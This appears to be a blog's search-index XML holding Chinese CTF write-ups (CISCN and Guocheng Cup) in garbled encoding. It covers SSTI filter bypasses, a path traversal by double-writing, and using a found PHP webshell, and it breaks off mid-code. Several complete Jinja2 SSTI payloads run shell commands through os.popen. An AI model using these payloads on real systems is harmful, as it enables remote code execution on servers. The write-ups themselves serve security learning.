<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CISCN&amp;é“ä¸‰-web</title>
      <link href="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/"/>
      <url>/2024/12/15/CISCN-%E9%93%81%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="å›½å†…ç½‘å®‰å®åœ¨æ˜¯å¤ªå¼ºè¾£ï¼Œæœ€å10åˆ†é’Ÿç›´æ¥æ‰ä¸€ç™¾æ¥åæğŸ˜ "><a href="#å›½å†…ç½‘å®‰å®åœ¨æ˜¯å¤ªå¼ºè¾£ï¼Œæœ€å10åˆ†é’Ÿç›´æ¥æ‰ä¸€ç™¾æ¥åæğŸ˜ " class="headerlink" title="å›½å†…ç½‘å®‰å®åœ¨æ˜¯å¤ªå¼ºè¾£ï¼Œæœ€å10åˆ†é’Ÿç›´æ¥æ‰ä¸€ç™¾æ¥åæğŸ˜ "></a>å›½å†…ç½‘å®‰å®åœ¨æ˜¯å¤ªå¼ºè¾£ï¼Œæœ€å10åˆ†é’Ÿç›´æ¥æ‰ä¸€ç™¾æ¥åæğŸ˜ </h1><h1 id="Safe-proxy"><a href="#Safe-proxy" class="headerlink" title="Safe_proxy"></a>Safe_proxy</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113314015.png" class="">  <p>çœ‹æºç å¯ä»¥å‘ç°å™¨/è·¯ç”±å­˜åœ¨sstiï¼Œå¹¶ä¸”ä¸ºæ— å›æ˜¾çš„sstiã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªæ€è·¯ï¼Œå†…å­˜é©¬æˆ–è€…æ‰“å›æ˜¾ã€‚æˆ‘è¿™é‡Œæ‰“ç®—æ‰“500æŠ¥é”™å›æ˜¾æ¯”è¾ƒæ–¹ä¾¿<br>æ‰“å†…å­˜é©¬ç›¸å¯¹è¦ç»•çš„ä¼šæ¯”è¾ƒå¤š<br><a href="https://lisien11.xyz/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/">python flask æ–°å‹å›æ˜¾çš„å­¦ä¹ å’Œè¿›ä¸€æ­¥çš„æ·±å…¥</a></p><p>å› ä¸ºwafç¦äº†__ï¼Œpopen sys osç­‰æˆ‘è¿™é‡Œé€‰æ‹©æ‹¼æ¥ç»•è¿‡</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_builtins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](((lipsum[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_spec_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>]|attr(<span class="string">&#x27;modules&#x27;</span>))[<span class="string">&#x27;werkzeug&#x27;</span>]|attr(<span class="string">&#x27;exceptions&#x27;</span>)|attr(<span class="string">&#x27;InternalServerError&#x27;</span>),<span class="string">&quot;description&quot;</span>,url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_buil&#x27;</span>+<span class="string">&#x27;tins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_buil&quot;</span>+<span class="string">&quot;tins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_imp&#x27;</span>+<span class="string">&#x27;ort_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>)[<span class="string">&#x27;modules&#x27;</span>][<span class="string">&#x27;werkzeug&#x27;</span>][<span class="string">&#x27;exceptions&#x27;</span>][<span class="string">&#x27;InternalServerError&#x27;</span>],<span class="string">&#x27;description&#x27;</span>,cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]())&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™ä¹ˆæ‹¼å»ºè®®ç”¨ç¬¬äºŒç§æ¯”è¾ƒæ–¹ä¾¿</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113756834.png" class="">  <p>å¦‚ä½•å¤šè¾“å‡ ä¸ª<code>&#123;&#123;&#125;&#125;</code>ä½¿å…¶æŠ¥é”™<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113811890.png" class="">  </p><h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114031142.png" class="">  <p>çœ‹æºç å¯ä»¥å‘ç°../hackme.phpå’Œ../tips.phpä¸¤ä¸ªæ–‡ä»¶ï¼Œå°è¯•è¯»å–<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114053587.png" class=""><br>ç›´æ¥è¯»å–ä¼šå’Œæˆ‘ä»¬è¯´ä¸åœ¨è¿™é‡Œï¼Œç»è¿‡å°è¯•ä¸ç®¡è¾“å…¥å¤šå°‘../èµ·éƒ½æ˜¯å›æ˜¾ä¸åœ¨è¿™é‡Œï¼Œä¸”ä¸è§¦å‘å…¶13å­—ç¬¦çš„é•¿åº¦é™åˆ¶ï¼ŒçŒœæµ‹../æ˜¯è¢«åˆ é™¤çš„<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114130457.png" class=""><br>ç»è¿‡å°è¯•å…¶å¯ä»¥åŒå†™ç»•è¿‡<br>â€¦/./hackme.php<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114238141.png" class=""><br>å¯ä»¥å‘ç°å…¶ä¸ºä¸€ä¸ªæ··æ·†è¿‡çš„ä»£ç <br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114456965.png" class=""><br>å¯ä»¥ç”¨echoä¸€å±‚ä¸€å±‚è¾“å‡º<br>å¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªphpçš„é©¬ï¼Œå¯†ç ä¸ºcmd<em>66.99<br>å› ä¸ºç‚¹ä¸èƒ½ä¼ æ‰€æœ‰å°†</em>æ”¹ä¸º<code>[</code>ä½¿åé¢çš„.ä¸ä¼šè¢«è‡ªåŠ¨è½¬ä¸º_ã€‚<br>æ‰€æœ‰æˆ‘ä»¬èšå‰‘çš„è¿æ¥å¯†ç ä¸º<code>cmd[66.99</code></p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114624797.png" class="">  <p>ç”¨æ’ä»¶ç›´æ¥ç»•è¿‡</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114647920.png" class="">  <p>å…¨å±€æœç´¢flagå¯ä»¥æ‰¾åˆ°flagæ–‡ä»¶</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp5.xä¸“é¢˜</title>
      <link href="/2024/12/13/thinkphp5-x%E4%B8%93%E9%A2%98/"/>
      <url>/2024/12/13/thinkphp5-x%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½åŸæ¯</title>
      <link href="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ä¸ªå›½åŸæ¯çš„é¢˜ç›®éš¾åº¦æœ‰é‚£ä¹ˆäº¿ç‚¹é«˜ï¼Œå¤ç°ä¸€ä¸‹åº”è¯¥èƒ½å­¦åˆ°ä¸å°‘ä¸œè¥¿"><a href="#è¿™ä¸ªå›½åŸæ¯çš„é¢˜ç›®éš¾åº¦æœ‰é‚£ä¹ˆäº¿ç‚¹é«˜ï¼Œå¤ç°ä¸€ä¸‹åº”è¯¥èƒ½å­¦åˆ°ä¸å°‘ä¸œè¥¿" class="headerlink" title="è¿™ä¸ªå›½åŸæ¯çš„é¢˜ç›®éš¾åº¦æœ‰é‚£ä¹ˆäº¿ç‚¹é«˜ï¼Œå¤ç°ä¸€ä¸‹åº”è¯¥èƒ½å­¦åˆ°ä¸å°‘ä¸œè¥¿"></a>è¿™ä¸ªå›½åŸæ¯çš„é¢˜ç›®éš¾åº¦æœ‰é‚£ä¹ˆäº¿ç‚¹é«˜ï¼Œå¤ç°ä¸€ä¸‹åº”è¯¥èƒ½å­¦åˆ°ä¸å°‘ä¸œè¥¿</h1><h1 id="Ez-Gallery"><a href="#Ez-Gallery" class="headerlink" title="Ez_Gallery"></a>Ez_Gallery</h1><p>é¦–å…ˆæ˜¯çˆ†ç ´éªŒè¯ç <br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-153657253.png" class=""><br>æˆ‘è¿™é‡Œç›´æ¥ç”¨captcha-killer+codereg.py<br><a href="https://github.com/f0ng/captcha-killer-modified/tree/main">https://github.com/f0ng/captcha-killer-modified/tree/main</a></p><p>å¯ä»¥çˆ†ç ´å‡ºå¯†ç ä¸º123456ã€‚ç„¶åè¿›å…¥åå¯ä»¥å‘ç°ä¸€ä¸ªæ–‡ä»¶è¯»å–<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-154105134.png" class=""><br>çœ‹æºç <br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-154240092.png" class=""><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-154336445.png" class="">  </p><p>æˆ‘ä»¬å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªæ— å›æ˜¾ä¸”flagæ²¡æœ‰è¯»å–æƒé™çš„sstiï¼Œé‚£è¿™å°±å¾ˆæ˜æ˜¾äº†å…¶æƒ³è®©æˆ‘ä»¬å°†æ‰§è¡Œå‘½ä»¤çš„å†…å®¹å¸¦å‡ºæ¥æˆ–è€…ç›²æ³¨ã€‚<br>ä½†å› ä¸ºå…¶å°†æ•°å­—å’Œç‚¹éƒ½ç»™è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¼¹shellå’Œdnså¤–å¸¦çš„éš¾åº¦å°±å¾ˆå¤§äº†ã€‚</p><p>è€Œä¸”å› ä¸ºè¿™é“é¢˜ç›®å¹¶æ¯”èµ›flaskæ¡†æ¶çš„è€Œæ˜¯pyramidåŠ wsgirefçš„æˆ‘ä»¬ä¸å¥½ä½¿ç”¨å†…å­˜é©¬ã€‚</p><p>è€Œæˆ‘åœ¨ä¹‹å‰æœ‰çœ‹è¿‡ä¸€ä¸ªå¸ˆå‚…çš„flaskå®½å‡çš„å“åº”å¤´å›æ˜¾æ€è·¯å¹¶è‡ªå·±è¿›è¡Œäº†ä¸€æ¬¡è°ƒè¯•<br><a href="https://lisien11.xyz/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/">python flask æ–°å‹å›æ˜¾çš„å­¦ä¹ å’Œè¿›ä¸€æ­¥çš„æ·±å…¥</a></p><p>å…¶åŸç†åƒserverå¤´ç­‰å›ºå®šçš„å“åº”å¤´å…¶å®éƒ½æ˜¯ç¡¬ç¼–ç åœ¨ä»£ç é‡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†è¿™äº›å€¼æ±¡æŸ“ä¸ºæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„ç»“æœä»è€Œè¿›è¡Œå›æ˜¾</p><p>æˆ‘å…ˆåœ¨æœ¬åœ°ç®€å•è°ƒäº†ä¸€ä¸‹è¿™ä¸ªå®½å‡ï¼Œæˆ‘å‰é¢è¯´äº†è¿™äº›è¯·æ±‚å¤´æ˜¯ç¡¬ç¼–ç çš„ï¼Œæ‰€æœ‰å¤§æ¦‚ç‡æ˜¯åœ¨ç¨‹åºåˆšå¼€å§‹è¿è¡Œæ—¶å°±å†™å…¥çš„ã€‚<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-155103524.png" class=""><br>æˆ‘ç›´æ¥å°†æ–­ç‚¹ä¸‹åˆ°äº†severå¯åŠ¨çš„åœ°æ–¹</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-155130064.png" class="">  <p>å¯ä»¥å‘ç°å…¶å°±æ˜¯ç¡¬ç¼–ç çš„<br>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹è°ƒï¼Œå°†è¿™äº›èµ‹å€¼çš„è¿‡ç¨‹è°ƒè¿‡å»ã€‚<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-155507709.png" class=""><br>è·³è¿‡åæˆ‘ä»¬æŸ¥çœ‹ä¸‹é¢æ§åˆ¶å°çš„å˜é‡ï¼Œä¼šå‘ç°å¾ˆå¤šå’Œå“åº”æœ‰å…³çš„ç±»å’Œå±æ€§<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-155637591.png" class=""><br>åƒè¿™ä¸ª<code>&lt;class &#39;wsgiref.simple_server.ServerHandler&#39;&gt;</code>ä¸‹çš„http_versionå•Šï¼Œserver_softwareå•Šã€‚<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-155831207.png" class=""><br>è¿˜æœ‰<code>&lt;class &#39;http.server.BaseHTTPRequestHandler&#39;&gt;</code>ä¸‹çš„responseså•Šï¼Œè¿™ä¸ªresponseså’Œä¹‹å‰æˆ‘è°ƒflaskçš„å¾ˆåƒï¼Œæˆ‘åœ¨flaskä¸ŠæˆåŠŸæ±¡æŸ“äº†500é¡µé¢ç¡¬ç¼–ç çš„å†…å®¹ã€‚è¿™ä¸ªåº”è¯¥ä¹Ÿå¯ä»¥åšåˆ°ã€‚</p><p>ã€‚æˆ‘ä»¬å¯ä»¥å…ˆè‡ªå·±åœ¨æœ¬åœ°æä¸€ä¸ªæœ‰å›æ˜¾çš„sstiã€‚æ¥å…ˆè°ƒä¸€è°ƒ<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-161038936.png" class=""><br>ç¨å¾®ä¿®æ”¹ä¸€ä¸‹shellè·¯ç”±<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-161312500.png" class=""><br>å’Œä¹‹å‰è°ƒflaskä¸€æ ·ä¸€æ­¥æ­¥çš„å¾€ä¸‹æ‰¾æˆ‘ä»¬è¦çš„wsgiref.simple_server.ServerHandler<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-161652674.png" class=""><br>å°±è¿™æ ·ä¸€æ­¥æ­¥çš„èµ°å°±å¯ä»¥çŸ¥é“å¦‚ä½•è·³è¿‡sysè·å–http_versionè¿™ä¸ªå±æ€§</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-161912246.png" class="">  <p>å…¶å€¼ä¹Ÿå°±æ˜¯å›æ˜¾æ ‡å¤´é‡Œçš„httpç‰ˆæœ¬<br>ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡setattræ¥æ›´æ”¹å…¶å€¼</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-162206265.png" class="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,<span class="string">&#x27;http_version&#x27;</span>,<span class="string">&quot;aaaa&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹è§å…¶å›æ˜¾çš„httpæ ‡å¤´å·²ç»æ¯ç¯¡æ”¹äº†ã€‚æˆ‘ä»¬å°†åé¢çªœæ”¹çš„å€¼æ”¹ä¸ºæˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œçš„payload<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-162401828.png" class=""><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum[<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;setattr&#x27;</span>](lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,<span class="string">&#x27;http_version&#x27;</span>,lipsum.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥è·ç¦»è§£å†³è¿™åˆ°é¢˜ç›®ä¹Ÿåªå‰©ä¸‹äº†å¦‚ä½•ç»•wafäº†<br>é¢˜ç›®è¿‡æ»¤äº†ç‚¹å¥½ï¼Œæˆ‘ä»¬çŸ¥é“å½“è¿‡æ»¤äº†ç‚¹å¥½sstiæˆ‘ä»¬æ˜¯å¯ä»¥ä½¿ç”¨[]æˆ–è€…|attr()æ¥ç»•è¿‡çš„ï¼Œä½†æ˜¯å•çº¯çš„å°†å…¶æ”¹ä¸º[]å’Œ|attr()æˆ‘ä»¬æ˜¯æ— æ³•æˆåŠŸæ±¡æŸ“çš„(ä¼šæŠ¥é”™)ã€‚æˆ‘ä¹‹å‰åœ¨è°ƒè¯•flaskæ˜¯å°±æœ‰æƒ³å°è¯•ä¸ä½¿ç”¨ç‚¹å¥½æ¥è¿›è¡Œæ±¡æŸ“ä½†æ˜¯å´å¤±è´¥äº†ä¹Ÿå°±æ²¡æœ‰ç»§ç»­æ¢è®¨ä¸‹å»äº†ã€‚</p><p>åœ¨å‰é¢è·å–setatterå’Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†æ²¡æœ‰ä»€ä¹ˆé—®é¢˜éƒ½å¯ä»¥é€šè¿‡ä¸­æ‹¬å·æ¥ç»•è¿‡è¿‡æ»¤ï¼Œä½†æ˜¯ä¸­é—´é€šè¿‡sysæ¥è·å–http<em>versionçš„è¿‡ç¨‹å´ä¸è¡Œ<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-163550043.png" class=""><br>æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªçš„è¿›è¡Œæ›¿æ¢çœ‹é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Œæˆ‘ä»¬å°±è¦çœ‹åˆ°å½“æˆ‘ä»¬å°†<code>.__init__</code>æ”¹ä¸º<code>[&#39;__init__&#39;]</code>å°±å‘ç°å…¶å‘ç”Ÿäº†æŠ¥é”™ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬å°†<code>lipsum[&#39;__spec__&#39;]</code>å½“æˆå­—å…¸äº†ã€‚<code>lipsum[&#39;__spec__&#39;]</code>ä»–è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬å…¶å¹¶æ²¡æœ‰å®ç°`<em>_getitem</em></em><code>æ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨</code>[]`æ¥å¯¹å…¶è¿›è¡Œè·å–ã€‚è¿™æ—¶æˆ‘ä»¬å°±è¦åƒåˆ°|attr()è¿™ä¸ªè¿‡æ»¤å™¨äº†ï¼Œè¿™ä¸ªè¿‡æ»¤å™¨å¯ä»¥è·å–å¯¹è±¡ï¼ˆæ¨¡å—ï¼Œç±»ï¼‰çš„å±æ€§ï¼Œ</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-171709111.png" class="">  <p>æˆ‘ä»¬ä½¿ç”¨|attr()å¯ä»¥å‘ç°å™¨æˆåŠŸå¾—åˆ°äº†ä¸€ä¸ªmethodç±»ã€‚å› ä¸ºæ˜¯classæ‰€ä»¥æˆ‘ä»¬ç»§ç»­ç”¨|attr(),å¯ä»¥å‘ç°è·å–åˆ°<code>__globals__</code>æ—¶å°±æ˜¯ä¸€ä¸ªå­—å…¸çœ‹ï¼Œæˆ‘ä»¬ç”¨ä¸­æ‹¬å·<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-171904219.png" class=""><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-172003348.png" class=""><br>ä½†æˆ‘ä»¬å‘ç°ç›´æ¥å®éªŒ[]è¿˜æ˜¯ä¸è¡Œ,è¿™æ˜¯å› ä¸º<code>lipsum[&#39;__spec__&#39;]|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)</code>è¿™ä¸ªæ•´ä½“æ‰æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å®éªŒæ‹¬å·å°†å…¶æ‹¬èµ·æ¥<br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-172411962.png" class=""><br>å‰©ä¸‹çš„å…¶å®å°±ä¸æ–­é‡å¤ä¸Šé¢çš„ä¸åœ¨ï¼Œé‡åˆ°å­—å…¸å°±åŠ æ‹¬å·å®éªŒ[]é‡åˆ°ç±»å°±ä½¿ç”¨|attr(â€˜â€™)</p><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-172836158.png" class="">  <p>å°±è¿™æ ·ï¼Œæœ€ç»ˆçš„payloadæˆ‘ä»¬å°±èƒ½æ„é€ å‡ºæ¥äº†å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;lipsum[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;setattr&#x27;](((lipsum[&#x27;__spec__&#x27;]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;))[&#x27;sys&#x27;]|attr(&#x27;modules&#x27;))[&#x27;wsgiref&#x27;]|attr(&#x27;simple_server&#x27;)|attr(&#x27;ServerHandler&#x27;),&#x27;http_version&#x27;,lipsum[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;)[&#x27;read&#x27;]())&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-173042460.png" class=""><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-174359447.png" class=""><br><img src="/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF/IMG_20241208-174410253.png" class="">  </p><p>èµ›åçœ‹å®˜æ–¹wpåˆèƒ½å­¦åˆ°ä¸å°‘ï¼Œåƒæ„é€ å†…å­˜é©¬ï¼Œè¿˜æœ‰ä¸Šé¢çš„payloadå…¶å®å¯ä»¥æ›´æ”¹ä¸€ä¸‹è®©ä»–åªç”¨[]ä¹Ÿèƒ½è¿›è¡Œbypassï¼Œè¿˜æœ‰ä½¿ç”¨getattr()æ¥ç»•è¿‡ç‚¹å·(æˆ‘å»è¿™ä¸ªè¿˜çœŸæœ‰ç‚¹ç®—ç›²ç‚¹äº†)ï¼Œä¸‹é¢è¯·å¬å®Œå¨“å¨“é“æ¥ã€‚</p><p><a href="https://xz.aliyun.com/t/12163?time__1311=GqGxRDuDgQD%3DqGN4eeqBKe47wcnAW33Ya4D">FlaskåŸºç¡€åŠæ¨¡æ¿æ³¨å…¥æ¼æ´ï¼ˆSSTIï¼‰</a></p><h1 id="n0ob-un4er"><a href="#n0ob-un4er" class="headerlink" title="n0ob_un4er"></a>n0ob_un4er</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$SECRET</span>  =<span class="string">&quot;asasas&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$role</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 